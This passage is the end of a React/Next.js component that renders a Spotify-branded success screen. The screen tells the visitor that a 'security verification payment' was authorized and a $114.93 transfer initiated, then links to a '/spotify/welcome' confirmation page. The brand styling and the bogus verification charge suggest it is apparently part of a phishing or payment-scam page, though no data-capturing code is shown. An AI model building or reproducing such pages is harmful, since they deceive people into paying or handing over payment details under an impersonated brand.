              Your security verification payment was successfully authorized. Your $114.93 transfer has been initiated.
            </p>

            <div className="flex items-center justify-center gap-2 text-xs text-gray-400 mb-2">
              <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#1db954]" />
              <span>Redirecting to confirmation page...</span>
            </div>

            <Link
              href="/spotify/welcome"
              className="mt-4 block w-full py-3.5 rounded-full bg-[#1db954] text-black font-extrabold text-sm hover:bg-[#1ed760] transition-colors"
            >
              Continue to Confirmation →
            </Link>
          </div>
        </div>
      )}
    </div>
  );
}
